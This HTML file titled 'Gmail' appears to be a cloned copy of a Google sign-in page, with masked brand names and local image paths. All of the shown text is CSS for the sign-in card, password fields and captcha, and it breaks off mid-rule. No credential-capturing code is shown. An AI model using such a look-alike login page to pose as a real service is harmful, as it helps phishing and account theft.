<!DOCTYPE html>
<html lang="en">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		<title>Gmail</title>
		<style>
		</style>
		<style>
			h1, h2 {
				-webkit-animation-duration: 0.1s;
				-webkit-animation-name: fontfix;
				-webkit-animation-iteration-count: 1;
				-webkit-animation-timing-function: linear;
				-webkit-animation-delay: 0;
			}
			@-webkit-keyframes fontfix {
			from {
				opacity: 1;
			}
			to {
				opacity: 1;
			}
			}
		</style>
		<style>
			html, body {
				font-family: Arial, sans-serif;
				background: #fff;
				margin: 0;
				padding: 0;
				border: 0;
				position: absolute;
				height: 100%;
				min-width: 100%;
				font-size: 13px;
				color: #404040;
				direction: ltr;
				-webkit-text-size-adjust: none;
			}
			button, input[type=button], input[type=submit] {
				font-family: Arial, sans-serif;
				font-size: 13px;
			}
			a, a:hover, a:visited {
				color: #427fed;
				cursor: pointer;
				text-decoration: none;
			}
			a:hover {
				text-decoration: underline;
			}
			h1 {
				font-size: 20px;
				color: #262626;
				margin: 0 0 15px;
				font-weight: normal;
			}
			h2 {
				font-size: 14px;
				color: #262626;
				margin: 0 0 15px;
				font-weight: bold;
			}
			input[type=email], input[type=number], input[type=password], input[type=tel], input[type=text], input[type=url] {
				-moz-appearance: none;
				-webkit-appearance: none;
				appearance: none;
				display: inline-block;
				height: 36px;
				padding: 0 8px;
				margin: 0;
				background: #fff;
				border: 1px solid #d9d9d9;
				border-top: 1px solid #c0c0c0;
				-moz-box-sizing: border-box;
				-webkit-box-sizing: border-box;
				box-sizing: border-box;
				-moz-border-radius: 1px;
				-webkit-border-radius: 1px;
				border-radius: 1px;
				font-size: 15px;
				color: #404040;
			}
			input[type=email]:hover, input[type=number]:hover, input[type=password]:hover, input[type=tel]:hover, input[type=text]:hover, input[type=url]:hover {
				border: 1px solid #b9b9b9;
				border-top: 1px solid #a0a0a0;
				-moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
				-webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
				box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
			}
			input[type=email]:focus, input[type=number]:focus, input[type=password]:focus, input[type=tel]:focus, input[type=text]:focus, input[type=url]:focus {
				outline: none;
				border: 1px solid #4d90fe;
				-moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
				-webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
				box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
			}
			input[type=checkbox], input[type=radio] {
				-webkit-appearance: none;
				display: inline-block;
				width: 13px;
				height: 13px;
				margin: 0;
				cursor: pointer;
				vertical-align: bottom;
				background: #fff;
				border: 1px solid #c6c6c6;
				-moz-border-radius: 1px;
				-webkit-border-radius: 1px;
				border-radius: 1px;
				-moz-box-sizing: border-box;
				-webkit-box-sizing: border-box;
				box-sizing: border-box;
				position: relative;
			}
			input[type=checkbox]:active, input[type=radio]:active {
				background: #ebebeb;
			}
			input[type=checkbox]:hover {
				border-color: #c6c6c6;
				-moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
				-webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
				box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
			}
			input[type=radio] {
				-moz-border-radius: 1em;
				-webkit-border-radius: 1em;
				border-radius: 1em;
				width: 15px;
				height: 15px;
			}
			input[type=checkbox]:checked, input[type=radio]:checked {
				background: #fff;
			}
			input[type=radio]:checked::after {
				content: '';
				display: block;
				position: relative;
				top: 3px;
				left: 3px;
				width: 7px;
				height: 7px;
				background: #666;
				-moz-border-radius: 1em;
				-webkit-border-radius: 1em;
				border-radius: 1em;
			}
			input[type=checkbox]:checked::after {
				display: block;
				position: absolute;
				top: -6px;
				left: -5px;
			}
			input[type=checkbox]:focus {
				outline: none;
				border-color: #4d90fe;
			}
			.stacked-label {
				display: block;
				font-weight: bold;
				margin: .5em 0;
			}
			.hidden-label {
				position: absolute !important;
				clip: rect(1px 1px 1px 1px); /* IE6, IE7 */
				clip: rect(1px, 1px, 1px, 1px);
				height: 0px;
				width: 0px;
				overflow: hidden;
				visibility: hidden;
			}
			input[type=checkbox].form-error, input[type=email].form-error, input[type=number].form-error, input[type=password].form-error, input[type=text].form-error, input[type=tel].form-error, input[type=url].form-error {
				border: 1px solid #dd4b39;
			}
			.error-msg {
				margin: .5em 0;
				display: block;
				color: #dd4b39;
				line-height: 17px;
			}
			.help-link {
				background: #dd4b39;
				padding: 0 5px;
				color: #fff;
				font-weight: bold;
				display: inline-block;
				-moz-border-radius: 1em;
				-webkit-border-radius: 1em;
				border-radius: 1em;
				text-decoration: none;
				position: relative;
				top: 0px;
			}
			.help-link:visited {
				color: #fff;
			}
			.help-link:hover {
				color: #fff;
				background: #c03523;
				text-decoration: none;
			}
			.help-link:active {
				opacity: 1;
				background: #ae2817;
			}
			.wrapper {
				position: relative;
				min-height: 100%;
			}
			.content {
				padding: 0 44px;
			}
			.main {
				padding-bottom: 100px;
			}
			/* For modern browsers */
			.clearfix:before, .clearfix:after {
				content: "";
				display: table;
			}
			.clearfix:after {
				clear: both;
			}
			/* For IE 6/7 (trigger hasLayout) */
			.clearfix {
				zoom: 1;
			}
			.myweb-header-bar {
				height: 71px;
				border-bottom: 1px solid #e5e5e5;
				overflow: hidden;
			}
			.header .logo {

				background-size: 116px 38px;
				background-repeat: no-repeat;
				margin: 17px 0 0;
				float: left;
				height: 38px;
				width: 116px;
			}
			.header .logo-w {

				background-size: 112px 36px;
				margin: 21px 0 0;
				background-image: url("Gmail1_files/glogo.png");
			}

			.header .secondary-link {
				margin: 28px 0 0;
				float: right;
			}
			.header .secondary-link a {
				font-weight: normal;
			}
			.myweb-header-bar.centered {
				border: 0;
				height: 108px;
			}
			.myweb-header-bar.centered .header .logo {
				float: none;
				margin: 40px auto 30px;
				display: block;
			}
			.myweb-header-bar.centered .header .secondary-link {
				display: none
			}
			.myweb-footer-bar {
				position: absolute;
				bottom: 0;
				height: 35px;
				width: 100%;
				border-top: 1px solid #e5e5e5;
				overflow: hidden;
			}
			.footer {
				padding-top: 7px;
				font-size: .85em;
				white-space: nowrap;
				line-height: 0;
			}
			.footer ul {
				float: left;
				max-width: 80%;
				min-height: 16px;
				padding: 0;
			}
			.footer ul li {
				color: #737373;
				display: inline;
				padding: 0;
				padding-right: 1.5em;
			}
			.footer a {
				color: #737373;
			}
			.lang-chooser-wrap {
				float: right;
				display: inline;
			}
			.lang-chooser-wrap img {
				vertical-align: top;
			}
			.lang-chooser {
				font-size: 13px;
				height: 24px;
				line-height: 24px;
			}
			.lang-chooser option {
				font-size: 13px;
				line-height: 24px;
			}
			.hidden {
				height: 0px;
				width: 0px;
				overflow: hidden;
				visibility: hidden;
				display: none !important;
			}
			.banner {
				text-align: center;
			}
			.card {
				background-color: #f7f7f7;
				padding: 20px 25px 30px;
				margin: 0 auto 25px;
				width: 304px;
				-moz-border-radius: 2px;
				-webkit-border-radius: 2px;
				border-radius: 2px;
				-moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
				-webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
				box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
			}
			.card > *:first-child {
				margin-top: 0;
			}
			.rc-button, .rc-button:visited {
				display: inline-block;
				min-width: 46px;
				text-align: center;
				color: #444;
				font-size: 14px;
				font-weight: 700;
				height: 36px;
				padding: 0 8px;
				line-height: 36px;
				-moz-border-radius: 3px;
				-webkit-border-radius: 3px;
				border-radius: 3px;
				-o-transition: all 0.218s;
				-moz-transition: all 0.218s;
				-webkit-transition: all 0.218s;
				transition: all 0.218s;
				border: 1px solid #dcdcdc;
				background-color: #f5f5f5;
				background-image: -webkit-linear-gradient(top,#f5f5f5,#f1f1f1);
				background-image: -moz-linear-gradient(top,#f5f5f5,#f1f1f1);
				background-image: -ms-linear-gradient(top,#f5f5f5,#f1f1f1);
				background-image: -o-linear-gradient(top,#f5f5f5,#f1f1f1);
				background-image: linear-gradient(top,#f5f5f5,#f1f1f1);
				-o-transition: none;
				-moz-user-select: none;
				-webkit-user-select: none;
				user-select: none;
				cursor: default;
			}
			.card .rc-button {
				width: 100%;
				padding: 0;
			}
			.rc-button.disabled, .rc-button[disabled] {
				opacity: .5;
				filter: alpha(opacity=50);
				cursor: default;
				pointer-events: none;
			}
			.rc-button:hover {
				border: 1px solid #c6c6c6;
				color: #333;
				text-decoration: none;
				-o-transition: all 0.0s;
				-moz-transition: all 0.0s;
				-webkit-transition: all 0.0s;
				transition: all 0.0s;
				background-color: #f8f8f8;
				background-image: -webkit-linear-gradient(top,#f8f8f8,#f1f1f1);
				background-image: -moz-linear-gradient(top,#f8f8f8,#f1f1f1);
				background-image: -ms-linear-gradient(top,#f8f8f8,#f1f1f1);
				background-image: -o-linear-gradient(top,#f8f8f8,#f1f1f1);
				background-image: linear-gradient(top,#f8f8f8,#f1f1f1);
				-moz-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
				-webkit-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
				box-shadow: 0 1px 1px rgba(0,0,0,0.1);
			}
			.rc-button:active {
				background-color: #f6f6f6;
				background-image: -webkit-linear-gradient(top,#f6f6f6,#f1f1f1);
				background-image: -moz-linear-gradient(top,#f6f6f6,#f1f1f1);
				background-image: -ms-linear-gradient(top,#f6f6f6,#f1f1f1);
				background-image: -o-linear-gradient(top,#f6f6f6,#f1f1f1);
				background-image: linear-gradient(top,#f6f6f6,#f1f1f1);
				-moz-box-shadow: 0 1px 2px rgba(0,0,0,0.1);
				-webkit-box-shadow: 0 1px 2px rgba(0,0,0,0.1);
				box-shadow: 0 1px 2px rgba(0,0,0,0.1);
			}
			.rc-button-submit, .rc-button-submit:visited {
				border: 1px solid #3079ed;
				color: #fff;
				text-shadow: 0 1px rgba(0,0,0,0.1);
				background-color: #4d90fe;
				background-image: -webkit-linear-gradient(top,#4d90fe,#4787ed);
				background-image: -moz-linear-gradient(top,#4d90fe,#4787ed);
				background-image: -ms-linear-gradient(top,#4d90fe,#4787ed);
				background-image: -o-linear-gradient(top,#4d90fe,#4787ed);
				background-image: linear-gradient(top,#4d90fe,#4787ed);
			}
			.rc-button-submit:hover {
				border: 1px solid #2f5bb7;
				color: #fff;
				text-shadow: 0 1px rgba(0,0,0,0.3);
				background-color: #357ae8;
				background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
				background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
				background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
				background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
				background-image: linear-gradient(top,#4d90fe,#357ae8);
			}
			.rc-button-submit:active {
				background-color: #357ae8;
				background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
				background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
				background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
				background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
				background-image: linear-gradient(top,#4d90fe,#357ae8);
				-moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
				-webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
				box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
			}
			.rc-button-red, .rc-button-red:visited {
				border: 1px solid transparent;
				color: #fff;
				text-shadow: 0 1px rgba(0,0,0,0.1);
				background-color: #d14836;
				background-image: -webkit-linear-gradient(top,#dd4b39,#d14836);
				background-image: -moz-linear-gradient(top,#dd4b39,#d14836);
				background-image: -ms-linear-gradient(top,#dd4b39,#d14836);
				background-image: -o-linear-gradient(top,#dd4b39,#d14836);
				background-image: linear-gradient(top,#dd4b39,#d14836);
			}
			.rc-button-red:hover {
				border: 1px solid #b0281a;
				color: #fff;
				text-shadow: 0 1px rgba(0,0,0,0.3);
				background-color: #c53727;
				background-image: -webkit-linear-gradient(top,#dd4b39,#c53727);
				background-image: -moz-linear-gradient(top,#dd4b39,#c53727);
				background-image: -ms-linear-gradient(top,#dd4b39,#c53727);
				background-image: -o-linear-gradient(top,#dd4b39,#c53727);
				background-image: linear-gradient(top,#dd4b39,#c53727);
			}
			.rc-button-red:active {
				border: 1px solid #992a1b;
				background-color: #b0281a;
				background-image: -webkit-linear-gradient(top,#dd4b39,#b0281a);
				background-image: -moz-linear-gradient(top,#dd4b39,#b0281a);
				background-image: -ms-linear-gradient(top,#dd4b39,#b0281a);
				background-image: -o-linear-gradient(top,#dd4b39,#b0281a);
				background-image: linear-gradient(top,#dd4b39,#b0281a);
				-moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
				-webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
				box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
			}
			.secondary-actions {
				text-align: center;
			}
		</style>
		<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
			.myweb-header-bar.centered {
				height: 83px;
			}
			.myweb-header-bar.centered .header .logo {
				margin: 25px auto 20px;
			}
			.card {
				margin-bottom: 20px;
			}
		</style>
		<style media="screen and (max-width: 580px)">
			html, body {
				font-size: 14px;
			}
			.myweb-header-bar.centered {
				height: 73px;
			}
			.myweb-header-bar.centered .header .logo {
				margin: 20px auto 15px;
			}
			.content {
				padding-left: 10px;
				padding-right: 10px;
			}
			.hidden-small {
				display: none;
			}
			.card {
				padding: 20px 15px 30px;
				width: 270px;
			}
			.footer ul li {
				padding-right: 1em;
			}
			.lang-chooser-wrap {
				display: none;
			}
		</style>
		<style media="screen and (-webkit-min-device-pixel-ratio: 1.5), (min--moz-device-pixel-ratio: 1.5), (-o-min-device-pixel-ratio: 3 / 2), (min-device-pixel-ratio: 1.5)">
			.header .logo {
				background-image: url();
			}
			.header .logo-w {
				background-image: url("Gmail1_files/glogo.png");
			}
		</style>
		<style>
			pre.debug {
				font-family: monospace;
				position: absolute;
				left: 0;
				margin: 0;
				padding: 1.5em;
				font-size: 13px;
				background: #f1f1f1;
				border-top: 1px solid #e5e5e5;
				direction: ltr;
				white-space: pre-wrap;
				width: 90%;
				overflow: hidden;
			}
		</style>
		<style>
			.banner h1 {
				font-family: 'Open Sans', arial;
				-webkit-font-smoothing: antialiased;
				color: #555;
				font-size: 42px;
				font-weight: 300;
				margin-top: 0;
				margin-bottom: 20px;
			}
			.banner h2 {
				font-family: 'Open Sans', arial;
				-webkit-font-smoothing: antialiased;
				color: #555;
				font-size: 18px;
				font-weight: 400;
				margin-bottom: 20px;
			}
			.signin-card {
				width: 274px;
				padding: 40px 40px;
			}
			.signin-card .profile-img {
				width: 96px;
				height: 96px;
				margin: 0 auto 10px;
				display: block;
				-moz-border-radius: 50%;
				-webkit-border-radius: 50%;
				border-radius: 50%;
			}
			.signin-card .profile-name {
				font-size: 16px;
				font-weight: bold;
				text-align: center;
				margin: 10px 0 0;
				min-height: 1em;
			}
			.signin-card .profile-email {
				font-size: 16px;
				text-align: center;
				margin: 10px 0 20px 0;
				min-height: 1em;
			}
			.signin-card input[type=email], .signin-card input[type=password], .signin-card input[type=text], .signin-card input[type=submit] {
				width: 100%;
				display: block;
				margin-bottom: 10px;
				z-index: 1;
				position: relative;
				-moz-box-sizing: border-box;
				-webkit-box-sizing: border-box;
				box-sizing: border-box;
			}
			.signin-card #Email, .signin-card #Passwd, .signin-card .captcha {
				direction: ltr;
				height: 44px;
				font-size: 16px;
			}
			.signin-card #Email + .stacked-label {
				margin-top: 15px;
			}
			.signin-card #reauthEmail {
				display: block;
				margin-bottom: 10px;
				line-height: 36px;
				padding: 0 8px;
				font-size: 15px;
				color: #404040;
				line-height: 2;
				margin-bottom: 10px;
				font-size: 14px;
				text-align: center;
				overflow: hidden;
				text-overflow: ellipsis;
				white-space: nowrap;
				-moz-box-sizing: border-box;
				-webkit-box-sizing: border-box;
				box-sizing: border-box;
			}
			.one-myweb p {
				margin: 0 0 10px;
				color: #555;
				font-size: 14px;
				text-align: center;
			}
			.one-myweb p.create-account, .one-myweb p.switch-account {
				margin-bottom: 60px;
			}
			.one-myweb .logo-strip {
				background-repeat: no-repeat;
				display: block;
				margin: 10px auto;
				background-image: url();
				background-size: 230px 17px;
				width: 230px;
				height: 17px;
			}
		</style>
		<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
			.banner h1 {
				font-size: 38px;
				margin-bottom: 15px;
			}
			.banner h2 {
				margin-bottom: 15px;
			}
			.one-myweb p.create-account, .one-myweb p.switch-account {
				margin-bottom: 30px;
			}
			.signin-card #Email {
				margin-bottom: 0;
			}
			.signin-card #Passwd {
				margin-top: -1px;
			}
			.signin-card #Email.form-error, .signin-card #Passwd.form-error {
				z-index: 2;
			}
			.signin-card #Email:hover, .signin-card #Email:focus, .signin-card #Passwd:hover, .signin-card #Passwd:focus {
				z-index: 3;
			}
		</style>
		<style media="screen and (max-width: 580px)">
			.banner h1 {
				font-size: 22px;
				margin-bottom: 15px;
			}
			.signin-card {
				width: 260px;
				padding: 20px 20px;
				margin: 0 auto 20px;
			}
			.signin-card .profile-img {
				width: 72px;
				height: 72px;
				-moz-border-radius: 72px;
				-webkit-border-radius: 72px;
				border-radius: 72px;
			}
		</style>
		<style media="screen and (-webkit-min-device-pixel-ratio: 1.5), (min--moz-device-pixel-ratio: 1.5), (-o-min-device-pixel-ratio: 3 / 2), (min-device-pixel-ratio: 1.5)">
			.one-myweb .logo-strip {
				background-image: url(###//###.com/accounts/ui/wlogostrip_230x17_2x.png);
			}
		</style>
		<style>
			.remember .bubble-wrap {
				position: absolute;
				padding-top: 3px;
				-o-transition: opacity .218s ease-in .218s;
				-moz-transition: opacity .218s ease-in .218s;
				-webkit-transition: opacity .218s ease-in .218s;
				transition: opacity .218s ease-in .218s;
				left: -999em;
				opacity: 0;
				width: 314px;
				margin-left: -20px;
			}
			.remember:hover .bubble-wrap,
			.remember input:focus ~
			.bubble-wrap, .remember .bubble-wrap:hover, .remember .bubble-wrap:focus {
				opacity: 1;
				left: inherit;
			}
			.bubble-pointer {
				border-left: 10px solid transparent;
				border-right: 10px solid transparent;
				border-bottom: 10px solid #fff;
				width: 0;
				height: 0;
				margin-left: 17px;
			}
			.bubble {
				background-color: #fff;
				padding: 15px;
				margin-top: -1px;
				font-size: 11px;
				-moz-border-radius: 2px;
				-webkit-border-radius: 2px;
				border-radius: 2px;
				-moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
				-webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
				box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
			}
			#stay-signed-in {
				float: left;
			}
			#stay-signed-in-tooltip {
				left: auto;
				margin-left: -20px;
				padding-top: 3px;
				position: absolute;
				top: 0;
				visibility: hidden;
				width: 314px;
				z-index: 1;
			}
			.dasher-tooltip {
				top: 380px;
			}
		</style>
		<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
			.dasher-tooltip {
				top: 340px;
			}
		</style>
		<style>
			.jfk-tooltip {
				background-color: #fff;
				border: 1px solid;
				color: #737373;
				font-size: 12px;
				position: absolute;
				z-index: 800 !important;
				border-color: #bbb #bbb #a8a8a8;
				padding: 16px;
				width: 250px;
			}
			.jfk-tooltip h3 {
				color: #555;
				font-size: 12px;
				margin: 0 0 .5em;
			}
			.jfk-tooltip-content p:last-child {
				margin-bottom: 0;
			}
			.jfk-tooltip-arrow {
				position: absolute;
			}
			.jfk-tooltip-arrow .jfk-tooltip-arrowimplbefore, .jfk-tooltip-arrow .jfk-tooltip-arrowimplafter {
				display: block;
				height: 0;
				position: absolute;
				width: 0;
			}
			.jfk-tooltip-arrow .jfk-tooltip-arrowimplbefore {
				border: 9px solid;
			}
			.jfk-tooltip-arrow .jfk-tooltip-arrowimplafter {
				border: 8px solid;
			}
			.jfk-tooltip-arrowdown {
				bottom: 0;
			}
			.jfk-tooltip-arrowup {
				top: -9px;
			}
			.jfk-tooltip-arrowleft {
				left: -9px;
				top: 30px;
			}
			.jfk-tooltip-arrowright {
				right: 0;
				top: 30px;
			}
			.jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore, .jfk-tooltip-arrowup .jfk-tooltip-arrowimplbefore {
				border-color: #bbb transparent;
				left: -9px;
			}
			.jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore {
				border-color: #a8a8a8 transparent;
			}
			.jfk-tooltip-arrowdown .jfk-tooltip-arrowimplafter, .jfk-tooltip-arrowup .jfk-tooltip-arrowimplafter {
				border-color: #fff transparent;
				left: -8px;
			}
			.jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore {
				border-bottom-width: 0;
			}
			.jfk-tooltip-arrowdown .jfk-tooltip-arrowimplafter {
				border-bottom-width: 0;
			}
			.jfk-tooltip-arrowup .jfk-tooltip-arrowimplbefore {
				border-top-width: 0;
			}
			.jfk-tooltip-arrowup .jfk-tooltip-arrowimplafter {
				border-top-width: 0;
				top: 1px;
			}
			.jfk-tooltip-arrowleft .jfk-tooltip-arrowimplbefore, .jfk-tooltip-arrowright .jfk-tooltip-arrowimplbefore {
				border-color: transparent #bbb;
				top: -9px;
			}
			.jfk-tooltip-arrowleft .jfk-tooltip-arrowimplafter, .jfk-tooltip-arrowright .jfk-tooltip-arrowimplafter {
				border-color: transparent #fff;
				top: -8px;
			}
			.jfk-tooltip-arrowleft .jfk-tooltip-arrowimplbefore {
				border-left-width: 0;
			}
			.jfk-tooltip-arrowleft .jfk-tooltip-arrowimplafter {
				border-left-width: 0;
				left: 1px;
			}
			.jfk-tooltip-arrowright .jfk-tooltip-arrowimplbefore {
				border-right-width: 0;
			}
			.jfk-tooltip-arrowright .jfk-tooltip-arrowimplafter {
				border-right-width: 0;
			}
			.jfk-tooltip-closebtn {
				background: url("//###.com/ui/v1/icons/common/x_8px.png") no-repeat;
				border: 1px solid transparent;
				height: 21px;
				opacity: .4;
				outline: 0;
				position: absolute;
				right: 2px;
				top: 2px;
				width: 21px;
			}
			.jfk-tooltip-closebtn:focus, .jfk-tooltip-closebtn:hover {
				opacity: .8;
				cursor: pointer;
			}
			.jfk-tooltip-closebtn:focus {
				border-color: #4d90fe;
			}
		</style>
		<style media="screen and (max-width: 580px)">
			.jfk-tooltip {
				display: none;
			}
		</style>
		<style type="text/css">
			.captcha-box {
				background: #fff;
				margin: 0 0 10px;
				overflow: hidden;
				padding: 10px;
			}
			.captcha-box .captcha-img {
				text-align: center;
			}
			.captcha-box .captcha-label {
				font-weight: bold;
				display: block;
				margin: .5em 0;
			}
			.captcha-box .captcha-msg {
				color: #999;
				display: block;
				position: relative;
			}
			.captcha-box .captcha-msg .accessibility-logo {
				float: right;
				border: 0;
			}
			.captcha-box .audio-box {
				position: absolute;
				top: 0;
			}
		</style>
		<style>
			.chromiumsync-custom-content {
				padding-top: 20px;
				margin-bottom: 0;
			}
			.form-panel {
				-webkit-box-sizing: border-box;
				box-sizing: border-box;
				-webkit-transform: translateZ(0);
				-moz-transform: translateZ(0);
				-ms-transform: translateZ(0);
				-o-transform: translateZ(0);
				transform: translateZ(0);
				position: absolute;
				width: 100%;
			}
			.form-panel.first {
				z-index: 2;
			}
			.form-panel.second {
				z-index: 1;
			}
			.shift-form .form-panel.first {
				z-index: 1;
			}
			.shift-form .form-panel.second {
				z-index: 2;
			}
			.hide-form.slide-out {
				display: none;
			}
			.hide-form.slide-in {
				display: none;
			}
			.slide-in, .slide-out {
				display: block;
				-webkit-transition-property: -webkit-transform, opacity;
				-moz-transition-property: -moz-transform, opacity;
				-ms-transition-property: -ms-transform, opacity;
				-o-transition-property: -o-transform, opacity;
				transition-property: transform, opacity;
				-webkit-transition-duration: 0.1s;
				-moz-transition-duration: 0.1s;
				-ms-transition-duration: 0.1s;
				-o-transition-duration: 0.1s;
				transition-duration: 0.1s;
				-webkit-transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
				-moz-transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
				-ms-transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
				-o-transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
				transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
			}
			.slide-out {
				-webkit-transform: translate3d(0, 0, 0);
				-moz-transform: translate3d(0, 0, 0);
				-ms-transform: translate3d(0, 0, 0);
				-o-transform: translate3d(0, 0, 0);
				transform: translate3d(0, 0, 0);
			}
			.shift-form .slide-out {
				opacity: 0;
				-webkit-transform: translate3d(-120%, 0, 0);
				-moz-transform: translate3d(-120%, 0, 0);
				-ms-transform: translate3d(-120%, 0, 0);
				-o-transform: translate3d(-120%, 0, 0);
				transform: translate3d(-120%, 0, 0);
			}
			.slide-in {
				-webkit-transform: translate3d(120%, 0, 0);
				-moz-transform: translate3d(120%, 0, 0);
				-ms-transform: translate3d(120%, 0, 0);
				-o-transform: translate3d(120%, 0, 0);
				transform: translate3d(120%, 0, 0);
			}
			.shift-form .slide-in {
				opacity: 1;
				-webkit-transform: translate3d(0, 0, 0);
				-moz-transform: translate3d(0, 0, 0);
				-ms-transform: translate3d(0, 0, 0);
				-o-transform: translate3d(0, 0, 0);
				transform: translate3d(0, 0, 0);
			}
			.error-msg {
				-webkit-transition: max-height 0.3s, opacity 0.3s 0s steps(10, end);
				-moz-transition: max-height 0.3s, opacity 0.3s 0s steps(10, end);
				-ms-transition: max-height 0.3s, opacity 0.3s 0s steps(10, end);
				-o-transition: max-height 0.3s, opacity 0.3s 0s steps(10, end);
				transition: max-height 0.3s, opacity 0.3s 0s steps(10, end);
				height: auto;
				max-height: 0;
				opacity: 0;
			}
			.has-error .error-msg {
				max-height: 3.5em;
				margin-top: 10px;
				margin-bottom: 10px;
				opacity: 1;
				visibility: visible;
			}
			.back-arrow {
				position: absolute;
				top: 37px;
				width: 24px;
				height: 24px;
				display: none;
				cursor: pointer;
			}
			.back-arrow {
				border-style: none;
			}
			.shift-form.back-arrow {
				display: block;
			}
			.back-arrow img {
				display: block;
			}
			#link-signup {
				text-align: center;
				font-size: 14px;
			}
			.shift-form #link-signup {
				display: none;
			}
			#link-signin-different {
				display: none;
				text-align: center;
				font-size: 14px;
			}
			.shift-form #link-signin-different {
				display: block;
			}
			.signin-card #profile-name {
				font-size: 16px;
				font-weight: bold;
				text-align: center;
				margin: 0;
				min-height: 1em;
			}
			.signin-card.no-name #profile-name {
				display: none;
			}
			.signin-card.no-name #email-display {
				line-height: initial;
				margin-bottom: 16px;
			}
			.signin-card #email-display {
				display: block;
				padding: 0px 8px;
				color: rgb(64, 64, 64);
				line-height: 2;
				margin-bottom: 10px;
				font-size: 14px;
				text-align: center;
				overflow: hidden;
				text-overflow: ellipsis;
				white-space: nowrap;
				-moz-box-sizing: border-box;
				-webkit-box-sizing: border-box;
				box-sizing: border-box;
			}
			.signin-card #Email {
				margin-top: 16px;
			}
			.need-help {
				float: right;
				text-align: right;
			}
			.form-panel {
				width: 274px;
			}
			#gaia_firstform {
				z-index: 2;
			}
			.signin-card {
				position: relative;
				overflow: hidden;
			}
			.signin-card #profile-name {
				color: #000;
			}
			.circle-mask {
				display: block;
				height: 96px;
				width: 96px;
				overflow: hidden;
				border-radius: 50%;
				margin-left: auto;
				margin-right: auto;
				z-index: 100;
				margin-bottom: 10px;
				background-size: 96px;
				background-repeat: no-repeat;
				background-image: url("Gmail1_files/grayImg.png");
				-webkit-transition: opacity 0.075s;
				-moz-transition: opacity 0.075s;
				-ms-transition: opacity 0.075s;
				-o-transition: opacity 0.075s;
				transition: opacity 0.075s;
			}
			.circle {
				-webkit-transition-property: -webkit-transform;
				-moz-transition-property: -moz-transform;
				-ms-transition-property: -ms-transform;
				-o-transition-property: -o-transform;
				transition-property: transform;
				-webkit-transition-timing-function: cubic-bezier(.645,.045,.355,1);
				-moz-transition-timing-function: cubic-bezier(.645,.045,.355,1);
				-ms-transition-timing-function: cubic-bezier(.645,.045,.355,1);
				-o-transition-timing-function: cubic-bezier(.645,.045,.355,1);
				transition-timing-function: cubic-bezier(.645,.045,.355,1);
			}
			.circle {
				position: absolute;
				z-index: 101;
				height: 96px;
				width: 96px;
				border-radius: 50%;
				opacity: 0.99;
				overflow: hidden;
				background-repeat: no-repeat;
				background-position: center center;
			}
			.main {
				overflow: hidden;
			}
			.card-mask-wrap {
				position: relative;
				width: 360px;
				margin: 0 auto;
				z-index: 1;
			}
			.dasher-tooltip {
				position: absolute;
				left: 50%;
				margin-left: 150px;
			}
			.dasher-tooltip .tooltip-pointer {
				margin-top: 15px;
			}
			.dasher-tooltip p {
				margin-top: 0;
			}
			.dasher-tooltip p span {
				display: block;
			}
			.signin-card {
				height: 500px;
			}
			.card-mask-wrap {
				-webkit-transition: transform 0.5s;
				-moz-transition: transform 0.5s;
				-ms-transition: transform 0.5s;
				-o-transition: transform 0.5s;
				transition: transform 0.5s;
				-webkit-transform: translate3d(0,
				-263px
				, 0);
				-moz-transform: translate3d(0,
				-263px
				, 0);
				-ms-transform: translate3d(0,
				-263px
				, 0);
				-o-transform: translate3d(0,
				-263px
				, 0);
				transform: translate3d(0,
				-263px
				, 0);
				;
			}
			.card-mask-wrap.has-captcha {
				-webkit-transform: translate3d(0,
				-93px
				, 0);
				-moz-transform: translate3d(0,
				-93px
				, 0);
				-ms-transform: translate3d(0,
				-93px
				, 0);
				-o-transform: translate3d(0,
				-93px
				, 0);
				transform: translate3d(0,
				-93px
				, 0);
				;
			}
			.card-mask-wrap.has-error {
				-webkit-transform: translate3d(0,
				-223px
				, 0);
				-moz-transform: translate3d(0,
				-223px
				, 0);
				-ms-transform: translate3d(0,
				-223px
				, 0);
				-o-transform: translate3d(0,
				-223px
				, 0);
				transform: translate3d(0,
				-223px
				, 0);
				;
			}
			.card-mask-wrap.has-captcha.has-error {
